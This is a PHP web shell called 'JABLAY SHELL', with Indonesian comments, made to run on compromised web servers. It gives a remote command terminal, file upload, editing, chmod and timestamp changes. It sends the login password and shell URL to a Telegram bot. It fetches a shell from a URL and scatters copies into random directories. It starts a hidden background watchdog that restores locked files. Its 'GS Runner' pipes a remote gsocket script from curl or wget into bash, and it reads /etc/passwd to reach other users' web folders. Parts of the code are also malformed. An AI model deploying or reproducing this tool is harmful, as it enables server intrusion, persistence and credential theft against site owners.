<?php
session_start();

// TAMPILKAN ERROR
error_reporting(E_ALL);
ini_set('display_errors', 1);
// ============ LOGIN =============
if (!isset($_SESSION['login'])) {
    if (isset($_POST['pass']) && password_verify($_POST['pass'], $hashed_password)) {
        $_SESSION['login'] = true;

        // ✅ Kirim Telegram
        sendTelegram($_SERVER['HTTP_HOST'], trim(dirname($_SERVER['PHP_SELF']), '/'), basename(__FILE__), $_POST['pass']);

        header("Location: ?");
        exit;
    }
}
// UTIL
function sendTelegram($domain, $path, $file, $passwordInput) {
    global $botToken, $chatId;
    $ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
    $msg = "SHELL NYA TUAN\nIP: $ip\nURL : https://$domain/$path/$file\nPASS: $passwordInput";

    $data = [
        'chat_id' => $chatId,
        'text' => $msg
    ];

    $ch = curl_init("https://api.telegram.org/bot$botToken/sendMessage");
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    $error = curl_error($ch);
    curl_close($ch);

    // Log untuk debug (hapus jika tidak perlu)
    file_put_contents('/tmp/telegram_log.txt', "RESP:\n$response\nERROR:\n$error");
}
if (function_exists('sendTelegram')) {
    sendTelegram($_SERVER['HTTP_HOST'], trim(dirname($_SERVER['PHP_SELF']), '/'), basename(__FILE__), $_SESSION['password_input'] ?? 'unknown');
}
if (
    isset($_POST['username'], $_POST['password']) &&
    $_POST['username'] === $username &&
    password_verify($_POST['password'], $passwordHash)
) {
    $_SESSION['loggedin'] = true;
    // tindakan selanjutnya...
}

    // Kirim notifikasi Telegram
    sendTelegram($_SERVER['HTTP_HOST'], trim(dirname($_SERVER['PHP_SELF']), '/'), basename(__FILE__), 'admin login');

    header("Location: " . $_SERVER['PHP_SELF']);
    exit();
}
function safe_exec($cmd) {
    // shell_exec
    if (function_exists('shell_exec') && is_callable('shell_exec')) {
        return shell_exec($cmd);
    }

    // system
    if (function_exists('system') && is_callable('system')) {
        ob_start();
        system($cmd);
        return ob_get_clean();
    }

    // exec
    if (function_exists('exec') && is_callable('exec')) {
        exec($cmd, $out);
        return implode("\n", $out);
    }

    // passthru
    if (function_exists('passthru') && is_callable('passthru')) {
        ob_start();
        passthru($cmd);
        return ob_get_clean();
    }

    // proc_open
    if (function_exists('proc_open') && is_callable('proc_open')) {
        $descriptorspec = [
            0 => ["pipe", "r"],  // stdin
            1 => ["pipe", "w"],  // stdout
            2 => ["pipe", "w"]   // stderr
        ];
        $process = proc_open($cmd, $descriptorspec, $pipes);
        if (is_resource($process)) {
            $output = stream_get_contents($pipes[1]);
            fclose($pipes[1]);
            fclose($pipes[0]);
            fclose($pipes[2]);
            proc_close($process);
            return $output;
        }
    }

    // popen
    if (function_exists('popen') && is_callable('popen')) {
        $handle = popen($cmd, 'r');
        $output = '';
        if (is_resource($handle)) {
            while (!feof($handle)) {
                $output .= fread($handle, 4096);
            }
            pclose($handle);
            return $output;
        }
    }

    return "❌ Semua fungsi eksekusi dinonaktifkan di server ini.";
}

function rand_str($len = 8) {
    return substr(str_shuffle('abcdefghijklmnopqrstuvwxyz0123456789'), 0, $len);
}

// LOGOUT
if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: ?");
    exit;
}


// PATH
$dir = isset($_GET['path']) ? realpath($_GET['path']) : getcwd();
if (!$dir || !is_dir($dir)) $dir = getcwd();
$dirReal = realpath($dir);

// HANDLER
if (isset($_POST['cmd'])) {
    $terminalOutput = safe_exec($_POST['cmd']);
}
if (isset($_POST['gs_command'])) {
    $gsOutput = shell_exec($_POST['gs_command']);
    @unlink("defunct");
    @unlink("defunct.dat");
}
if (isset($_FILES['upload'])) move_uploaded_file($_FILES['upload']['tmp_name'], $dirReal.'/'.$_FILES['upload']['name']);
if (isset($_POST['newfile'])) file_put_contents($dirReal.'/'.$_POST['newfile'], '');
if (isset($_POST['newfolder'])) mkdir($dirReal.'/'.$_POST['newfolder']);
if (isset($_POST['savefile'], $_POST['filename'])) {
    file_put_contents($_POST['filename'], $_POST['savefile']);
    header("Location: ?path=" . urlencode(dirname($_POST['filename']))); exit;
}
if (isset($_POST['ajax_rename'])) {
    $old = $_POST['old'] ?? '';
    $new = $_POST['new'] ?? '';

    if (!file_exists($old)) {
        exit(json_encode(['status' => 'error', 'message' => 'Original file not found']));
    }

    $dir = dirname($old); // ambil direktori lama
    $newPath = $dir . DIRECTORY_SEPARATOR . $new;

    if (@rename($old, $newPath)) {
        exit(json_encode(['status' => 'success']));
    } else {
        exit(json_encode(['status' => 'error', 'message' => 'Rename failed']));
    }
}

// ⬇️ SISIPAN UNTUK CHMOD (Edit Permissions)
if (isset($_POST['chmod_file'], $_POST['chmod_val'])) {
    $target = $_POST['chmod_file'];
    $perm = $_POST['chmod_val'];
    if (!preg_match('/^[0-7]{3,4}$/', $perm)) {
        echo "<div class='text-red-500 p-2'>❌ Invalid permission format: $perm</div>";
    } else {
        if (@chmod($target, octdec($perm))) {
            echo "<div class='text-green-500 p-2'>✅ Permissions updated for <code>" . htmlspecialchars(basename($target)) . "</code> → <code>$perm</code></div>";
        } else {
            echo "<div class='text-red-500 p-2'>❌ Failed to chmod <code>" . htmlspecialchars(basename($target)) . "</code></div>";
        }
    }
}
// Handler AJAX untuk chmod
if (isset($_POST['ajax_chmod'])) {
    $file = $_POST['path'] ?? '';
    $mode = $_POST['mode'] ?? '';

    if (!file_exists($file)) {
        exit(json_encode(['status' => 'error', 'message' => 'File not found']));
    }

    if (!preg_match('/^[0-7]{3,4}$/', $mode)) {
        exit(json_encode(['status' => 'error', 'message' => 'Invalid chmod']));
    }

    if (chmod($file, octdec($mode))) {
        exit(json_encode(['status' => 'success']));
    } else {
        exit(json_encode(['status' => 'error', 'message' => 'chmod failed']));
    }
}
if (isset($_POST['ajax_modify'])) {
    $file = $_POST['path'] ?? '';
    $mtime = $_POST['mtime'] ?? '';
    if (!file_exists($file)) {
        exit(json_encode(['status' => 'error', 'message' => 'File not found']));
    }
    $time = strtotime($mtime);
    if ($time === false) {
        exit(json_encode(['status' => 'error', 'message' => 'Invalid datetime format']));
    }
    if (touch($file, $time)) {
        exit(json_encode(['status' => 'success']));
    } else {
        exit(json_encode(['status' => 'error', 'message' => 'touch() failed']));
    }
}
if (isset($_GET['edit']) && is_file($_GET['edit'])) {
    $f = $_GET['edit'];
    $c = htmlspecialchars(file_get_contents($f));
    echo "<!DOCTYPE html><html><head><meta charset='UTF-8'><script src='https://cdn.tailwindcss.com'></script></head>
    <body class='bg-gray-900 text-white p-10'><div class='max-w-5xl mx-auto'>
    <h2 class='text-4xl mb-6'>Editing: <span class='text-green-400'>" . basename($f) . "</span></h2>
    <form method='POST'><textarea name='savefile' rows='25' class='w-full bg-black text-green-400 p-4 rounded border border-green-600'>$c</textarea>
    <input type='hidden' name='filename' value='$f'>
    <div class='mt-6 flex space-x-4'>
    <button type='submit' class='bg-green-600 px-6 py-3 rounded'>💾 Save</button>
    <a href='?path=" . urlencode(dirname($f)) . "' class='text-red-400 text-xl hover:underline'>Cancel</a>
    </div></form></div></body></html>"; exit;
}

if (isset($_POST['rename_from'], $_POST['rename_to'])) {
    $from = $_POST['rename_from'];
    $to = dirname($from) . DIRECTORY_SEPARATOR . basename($_POST['rename_to']);
    rename($from, $to);
    header("Location: ?path=" . urlencode(dirname($from)));
    exit;
}
if (isset($_POST['target'], $_POST['perm'])) {
    chmod($_POST['target'], octdec($_POST['perm']));
    header("Location: ?path=" . urlencode(dirname($_POST['target']))); exit;
}
if (isset($_GET['lock']) && is_file($_GET['lock'])) {
    $f = realpath($_GET['lock']);
    $hash = md5($f);
    $dir = dirname($f);
    $name = basename($f);

    $cache = "/dev/shm/.cache";
    @mkdir($cache, 0777, true);
    $backup = "$cache/$hash.php";
    copy($f, $backup);
    chmod($f, 0444);

    // Buat watchdog script
    $watchdog = "/tmp/.cache/lock_" . rand_str(8) . ".php";
    $code = <<<PHP
<?php
while (true) {
    if (!file_exists("$dir")) {mkdir("$dir");
    }
    if (!file_exists("$dir/$name")) {
        copy("$backup", "$dir/$name");
        chmod("$dir/$name", 0444);
    }
    if (@fileperms("$dir/$name") !== 0100444) {
        @chmod("$dir/$name", 0444);
    }
    if (@fileperms("$dir") !== 0040555) {
        @chmod("$dir", 0555);
    }
    usleep(500000);
}
PHP;

    @mkdir('/tmp/.cache', 0777, true);
    file_put_contents($watchdog, $code);
    chmod($watchdog, 0755);

    // Jalankan watcher di background
    system("/usr/bin/php $watchdog > /dev/null 2>&1 &");

    header("Location: ?path=" . urlencode($dir));
    exit;
}
if (isset($_GET['unlock']) && is_file($_GET['unlock'])) {
    chmod($_GET['unlock'], 0644);
    header("Location: ?path=" . urlencode(dirname($_GET['unlock']))); exit;
}
if (isset($_POST['tebar']) && isset($_POST['tebar_start']) && is_dir($_POST['tebar_start']) && isset($_POST['tebar_link'])) {
    $base = realpath($_POST['tebar_start']);
    $url = trim($_POST['tebar_link']);

    // Cek apakah file bisa diambil dari URL
    $src = @file_get_contents($url);
    if ($src === false) {
        $_SESSION['tebar_result'] = "<p class='text-red-500'>Gagal mengambil file dari URL: $url</p>";
        header("Location: ?path=" . urlencode($base));
        exit;
    }

    // Simpan source sementara di /tmp/.cache
    @mkdir("/tmp/.cache", 0777, true);
    $srcFile = "/tmp/.cache/" . rand_str(10) . ".txt";
    file_put_contents($srcFile, $src);

    // Cari semua direktori di dalam base path
    $dirs = array_filter(glob($base . '/*'), 'is_dir');
    shuffle($dirs);
    $selectedDirs = array_slice($dirs, 0, 5);

    // Tebar shell
    $result = "<h3 class='text-green-400 text-xl mb-4'>Shell Tersebar ke:</h3><ul class='list-disc ml-6'>";
    foreach ($selectedDirs as $dir) {
        $filename = rand_str(8) . '.php';
        $destination = rtrim($dir, '/') . '/' . $filename;
        copy($srcFile, $destination);
        $result .= "<li class='text-blue-400'>" . htmlspecialchars($destination) . "</li>";
    }
    $result .= "</ul>";

    $_SESSION['tebar_result'] = $result;
    header("Location: ?path=" . urlencode($base));
    exit;
}

if (isset($_POST['do_bypass']) && !empty($_POST['target_user'])) {
    $user = preg_replace('/[^a-zA-Z0-9_]/', '', $_POST['target_user']);
    $targetPath = "/home/$user/public_html/";

    if (is_dir($targetPath)) {
        header("Location: ?path=" . urlencode($targetPath));
        exit;
    } else {
        $_SESSION['tebar_result'] = "<p class='text-red-400'>Gagal: Direktori <code>$targetPath</code> tidak ditemukan atau tidak dapat diakses.</p>";
        header("Location: ?path=" . urlencode($dirReal));
        exit;
    }
}

// INFO
$uname = php_uname();
$user = get_current_user();
$serverIP = $_SERVER['SERVER_ADDR'] ?? gethostbyname(gethostname());
$clientIP = $_SERVER['REMOTE_ADDR'] ?? 'UNKNOWN';
$phpVer = phpversion();
$disk = disk_total_space($dirReal);
$free = disk_free_space($dirReal);
$used = $disk - $free;
$percent = round(($used / $disk) * 100);
$open_basedir = ini_get('open_basedir') ?: 'NONE';
?>
<!DOCTYPE html>
<html><head><meta charset="UTF-8"><script src="https://cdn.tailwindcss.com"></script></head>
<body class="bg-gray-900 text-white font-mono p-10">
  <div class="max-w-7xl mx-auto">

<!-- Header dan Logout -->
<div class="flex justify-between items-center mb-6">
  <!-- Header -->
  <h1 class="text-3xl md:text-5xl text-red-400 font-bold text-center w-full">౨ৎ JABLAY SHELL ౨ৎ</h1>
  
  <!-- Logout -->
  <div class="absolute right-10 top-10 md:static md:right-auto md:top-auto">
    <a href="?logout=true" class="text-red-400 text-sm hover:underline">Logout</a>
  </div>
</div>

    <!-- Info Server -->
    <div class="mb-4 text-sm space-y-1">
      <div><span class="text-green-400 font-bold">Uname:</span> <?= $uname ?></div>
      <div><span class="text-pink-400 font-bold">User:</span> <?= $user ?></div>
      <div><span class="text-red-400 font-bold">ServerIP:</span> <?= $serverIP ?> <span class="ml-4">Your IP: <?= $clientIP ?></span></div>
      <div><span class="text-purple-400 font-bold">PHP:</span> <?= $phpVer ?></div>
      <div><span class="text-yellow-400 font-bold">Disk:</span> <?= round($disk / 1e+9, 2) ?> GB, 
        <span class="text-green-300">Free: <?= round($free / 1e+9, 2) ?> GB (<?= 100 - $percent ?>%)</span>
      </div>
      <div><span class="text-blue-400 font-bold">Open_basedir:</span> <?= $open_basedir ?></div>
    </div>
	
    <!-- Status open_basedir -->
    <?php
    function is_open_basedir_restricted() {
        $testfile = tempnam(sys_get_temp_dir(), 'obtest_');
        $openbasedir = ini_get('open_basedir');
        if (!$openbasedir) return false;
        return !is_writable($testfile);
    }
    ?>
    <div class="mb-4 text-sm">
      <div>
        <span class="text-yellow-300 font-bold">open_basedir Status:</span>
        <?= is_open_basedir_restricted()
          ? "<span class='text-red-400'>ACTIVE & RESTRICTED</span>"
          : "<span class='text-green-400'>NONE or NOT RESTRICTED</span>" ?>
<div>
  <span class="text-blue-300 font-bold">disable_functions:</span>
  <div class="mt-1 max-w-full overflow-x-auto bg-gray-900 p-2 rounded text-sm text-white">
    <code><?=ini_get('disable_functions') ?: 'NONE' ?></code>
  </div>
</div>
	<script src="https://cdn.jsdelivr.net/npm/alpinejs@3.x.x/dist/cdn.min.js" defer></script>
    <!-- Terminal -->
    <form method="POST" class="mb-10">
      <label class="block mb-2 text-xl">Terminal</label>
      <input type="text" name="cmd" class="w-full p-2 text-black rounded" placeholder="whoami">
      <button type="submit" class="mt-2 bg-green-600 px-4 py-2 rounded">Execute</button>
      <?php if (!empty($terminalOutput)) echo "<pre class='bg-black text-green-400 mt-2 p-2 rounded'>$terminalOutput</pre>"; ?>
    </form>
<!-- Baris 3 Kolom: Tambah Anak, Bypass, GSocket -->
<div class="grid grid-cols-1 md:grid-cols-3 gap-4 mb-10">
  <!-- TAMBAH ANAK -->
  <div x-data="{ showTebar: false }" class="bg-gray-800 p-4 rounded-xl shadow-lg" x-cloak>
    <h2 class="text-white font-bold text-center mb-2">Tebar Shell</h2>
    <button @click="showTebar = !showTebar"
      class="bg-green-600 hover:bg-green-700 text-white font-semibold py-2 px-4 rounded w-full mb-2">
      ➕ TAMBAH ANAK
    </button>

    <form x-show="showTebar" x-transition method="post" class="space-y-3">
      <input type="text" name="tebar_start" placeholder="/var/www/html/"
        class="w-full p-2 rounded bg-gray-700 text-white placeholder-gray-400 border border-gray-600" required>

      <input type="text" name="tebar_link" placeholder="http://web.com/shell.txt"
        class="w-full p-2 rounded bg-gray-700 text-white placeholder-gray-400 border border-gray-600" required>

      <button type="submit" name="tebar" value="1"
        class="bg-blue-600 hover:bg-blue-700 text-white font-bold py-2 px-4 rounded w-full">
        🚀 Tebar Sekarang
      </button>
    </form>
  </div>

  <!-- BYPASS -->
  <div class="bg-gray-800 p-4 rounded-xl shadow-lg">
    <h2 class="text-white font-bold text-center mb-2">Bypass <span class="text-yellow-300">open_basedir</span></h2>
    <form method="POST" class="space-y-3">
      <select name="target_user" class="w-full text-black p-2 rounded">
        <?php
          foreach (explode("\n", file_get_contents("/etc/passwd")) as $line) {
            $parts = explode(":", $line);
            if (isset($parts[5]) && preg_match('~^/home/[^/]+/public_html~', $parts[5])) {
              echo "<option value='{$parts[0]}'>{$parts[0]}</option>";
            }
          }
        ?>
      </select>
      <button type="submit" name="do_bypass"
        class="bg-yellow-400 hover:bg-yellow-500 w-full text-black font-bold py-2 px-4 rounded">
        🔓 Bypass
      </button>
    </form>
  </div>

  <!-- GS -->
  <div x-data="{ showGS: false }" class="bg-gray-800 p-4 rounded-xl shadow-lg">
    <h2 class="text-white font-bold text-center mb-2">JANDA ANAK 2</h2>
    <button @click="showGS = !showGS"
      class="bg-red-600 hover:bg-red-700 w-full text-white font-bold py-2 px-4 rounded mb-2">
      ▶️ GS Runner
    </button>
    <form x-show="showGS" x-transition method="post" class="space-y-3" x-cloak>
      <select name="gs_command" class="w-full text-black p-2 rounded">
        <option value='bash -c "$(curl -fsSL https://gsocket.io/y)"'>curl</option>
        <option value='GS_NOCERTCHECK=1 bash -c "$(curl -fsSLk https://gsocket.io/y)"'>curl (no cert check)</option>
        <option value='bash -c "$(wget -qO- https://gsocket.io/y)"'>wget</option>
        <option value='GS_UNDO=1 bash -c "$(curl -fsSL https://gsocket.io/y)"'>undo</option>
      </select>
      <button type="submit" class="bg-red-600 hover:bg-red-700 w-full text-white font-bold py-2 px-4 rounded">
        ▶️ Run GS
      </button>
    </form>
    <?php if (!empty($gsOutput)) echo "<pre class='bg-black text-red-400 mt-2 p-2 rounded'>$gsOutput</pre>"; ?>
  </div>
</div>

<!-- File Actions: Upload / Create File / Dir -->
<div class="grid grid-cols-1 md:grid-cols-3 gap-4 mb-10">
  <!-- Upload -->
  <form method="POST" enctype="multipart/form-data" class="flex flex-col space-y-2">
    <input type="file" name="upload" class="w-full text-black p-2 rounded bg-white">
    <button type="submit" class="bg-blue-600 hover:bg-blue-700 text-white font-semibold py-2 rounded">
      📤 Upload
    </button>
  </form>

  <!-- Make File -->
  <form method="POST" class="flex flex-col space-y-2">
    <input type="text" name="newfile" placeholder="newfile.php"
      class="w-full text-black p-2 rounded bg-white" />
    <button type="submit" class="bg-purple-600 hover:bg-purple-700 text-white font-semibold py-2 rounded">
      📄 Make File
    </button>
  </form>

  <!-- Make Dir -->
  <form method="POST" class="flex flex-col space-y-2">
    <input type="text" name="newfolder" placeholder="new_folder"
      class="w-full text-black p-2 rounded bg-white" />
    <button type="submit" class="bg-pink-600 hover:bg-pink-700 text-white font-semibold py-2 rounded">
      📁 Make Dir
    </button>
  </form>
</div>

    <!-- Alpine.js -->
    <script src="https://cdn.jsdelivr.net/npm/alpinejs@3.x.x/dist/cdn.min.js" defer></script>

    <!-- Hasil Tebar -->
    <?php if (!empty($_SESSION['tebar_result'])) {
      echo "<div class='bg-gray-800 p-4 rounded mb-6'>" . $_SESSION['tebar_result'] . "</div>";
      unset($_SESSION['tebar_result']);
    } ?>

    <!-- Path Navigasi -->
    <?php
    $basePath = __DIR__;
    $dir = isset($_GET['path']) ? $_GET['path'] : $basePath;
    $dirReal = realpath($dir);
    ?>
    <div class="text-sm mb-4">
      Path:
      <a href="?path=<?= urlencode($basePath) ?>" class="text-green-400 hover:underline">🏠 Home</a>
      <?php
      $paths = explode(DIRECTORY_SEPARATOR, trim($dirReal, DIRECTORY_SEPARATOR));
      $build = '';
      echo ' /';
      foreach ($paths as $p) {
          $build .= DIRECTORY_SEPARATOR . $p;
          echo "<a href='?path=" . urlencode($build) . "' class='text-blue-400 hover:underline'>$p</a>/";
      }
      ?>
    </div>

    <!-- File Table -->
<table class="w-full table-auto border border-gray-700 text-sm">
  <thead>
  <tr class="bg-gray-800 text-left">
    <th class="p-2">Name <span class="text-xs text-gray-400">(click [R] to rename)</span></th>

    <th class="p-2 text-center">Size</th>
    <th class="p-2 text-center">Modify</th>
    <th class="p-2 text-center">Owner/Group</th>
    <th class="p-2 text-center">Permissions</th>
    <th class="p-2 text-center">Actions</th>
  </tr>
</thead>
  <tbody>
    <?php
    $files = is_readable($dirReal) ? array_diff(scandir($dirReal), ['.', '..']) : [];
    $dirs = $normalFiles = [];
    foreach ($files as $f) {
        $full = $dirReal . DIRECTORY_SEPARATOR . $f;
        if (is_dir($full)) $dirs[] = $f; else $normalFiles[] = $f;
    }
    $orderedFiles = array_merge($dirs, $normalFiles);
    foreach ($orderedFiles as $f) {
        $full = $dirReal . DIRECTORY_SEPARATOR . $f;
        $isDir = is_dir($full);
        $size = $isDir ? 'dir' : filesize($full) . ' B';
        $mtime = date("Y-m-d H:i:s", filemtime($full));
        $owner = posix_getpwuid(fileowner($full))['name'] ?? 'unknown';
        $group = posix_getgrgid(filegroup($full))['name'] ?? 'unknown';
        $perm = substr(sprintf('%o', fileperms($full)), -4);
        $permStr = fileperms($full) & 0x4000 ? 'd' : '-';
        $permStr .= ($filePerms = fileperms($full)) & 0x0100 ? 'r' : '-';
        $permStr .= $filePerms & 0x0080 ? 'w' : '-';
        $permStr .= $filePerms & 0x0040 ? 'x' : '-';
        $permStr .= $filePerms & 0x0020 ? 'r' : '-';
        $permStr .= $filePerms & 0x0010 ? 'w' : '-';
        $permStr .= $filePerms & 0x0008 ? 'x' : '-';
        $permStr .= $filePerms & 0x0004 ? 'r' : '-';
        $permStr .= $filePerms & 0x0002 ? 'w' : '-';
        $permStr .= $filePerms & 0x0001 ? 'x' : '-';

        $displayName = htmlspecialchars($f);
$encodedFull = htmlspecialchars($full);

if ($isDir) {
    $nameDisplay = "<a href='?path=" . urlencode($full) . "' class='text-yellow-400 hover:underline'>| $displayName |</a>";
} else {
    $nameDisplay = "<span class='text-white'>| $displayName</span>";
}

        $actions = [];

if (!$isDir) {
    $actions[] = "<a href='?edit=" . urlencode($full) . "' class='text-green-400'>E</a>";
    $actions[] = "<a href='?download=" . urlencode($full) . "&path=" . urlencode($dirReal) . "' class='text-blue-400'>D</a>";
}

// [R] Rename untuk file & folder (semua)
$actions[] = "
  <button type='button' class='rename-btn text-lime-400 hover:text-white text-xs'
          data-path='$encodedFull'
          data-name='" . htmlspecialchars($f) . "'>[R]</button>";

$actions[] = "<a href='?del=" . urlencode($full) . "' class='text-red-400'>X</a>";
$actions[] = "<a href='?lock=" . urlencode($full) . "' class='text-gray-400'>L</a>";
$actions[] = "<a href='?unlock=" . urlencode($full) . "' class='text-white'>U</a>";

        echo "<tr class='border-t border-gray-700'>
          <td class='p-2'>$nameDisplay</td>
          <td class='p-2 text-center'>$size</td>
          <td class='p-2 text-center'>
  <input type='text' value='$mtime' class='mtime-input bg-transparent border border-gray-600 w-44 text-center text-cyan-300' data-path='" . htmlspecialchars($full) . "' />
</td>
          <td class='p-2 text-center text-blue-300'>$owner/$group</td>
          <td class='p-2 text-center'>
  <input type='text' 
         class='chmod-input bg-transparent text-green-400 border-b border-green-400 text-center w-16 outline-none focus:bg-gray-800' 
         data-path='$encodedFull' 
         value='$perm' 
         title='Press Enter to apply chmod' />
  <div class='text-xs text-lime-300 mt-1'>$permStr</div>
</td>

          <td class='p-2 text-center space-x-2'>" . implode(' ', $actions) . "</td>
        </tr>";
    }
    ?>
  </tbody>
</table>

  </div>
<script>
document.querySelectorAll('.chmod-input').forEach(input => {
  input.addEventListener('keydown', e => {
    if (e.key === 'Enter') {
      const path = input.getAttribute('data-path');
      const mode = input.value.trim();
      if (!/^[0-7]{3,4}$/.test(mode)) {
        alert('Invalid chmod (must be 3 or 4 digits octal)');
        return;
      }
      const formData = new FormData();
      formData.append('ajax_chmod', 1);
      formData.append('path', path);
      formData.append('mode', mode);
      fetch('', {
        method: 'POST',
        body: formData
      }).then(r => r.json()).then(res => {
        if (res.status === 'success') location.reload();
        else alert(res.message || 'Chmod failed');
      });
    }
  });
});
</script>
<script>
document.querySelectorAll('.mtime-input').forEach(input => {
  input.addEventListener('keydown', function(e) {
    if (e.key === 'Enter') {
      e.preventDefault();      // 🛑 Mencegah form submit / refresh
      e.stopPropagation();     // 🔇 Menghentikan bubbling event

      const path = this.dataset.path;
      const mtime = this.value.trim();
      const formData = new FormData();
      formData.append('ajax_modify', 1);
      formData.append('path', path);
      formData.append('mtime', mtime);
      fetch('', {
        method: 'POST',
        body: formData
      }).then(r => r.json()).then(res => {
        if (res.status === 'success') location.reload();
        else alert(res.message || 'Modify failed');
      });
    }
  });
});
</script>
<script>
document.querySelectorAll('.rename-btn').forEach(btn => {
  btn.addEventListener('click', () => {
    const oldPath = btn.getAttribute('data-path');
    const currentName = btn.getAttribute('data-name');
    const newName = prompt("Rename to:", currentName);

    if (newName && newName !== currentName) {
      const formData = new FormData();
      formData.append('ajax_rename', 1);
      formData.append('old', oldPath);
      formData.append('new', newName);

      fetch('', {
        method: 'POST',
        body: formData
      }).then(res => res.json()).then(result => {
        if (result.status === 'success') {
          location.reload();
        } else {
          alert(result.message || 'Rename failed');
        }
      });
    }
  });
});
</script>
</body>
</html>
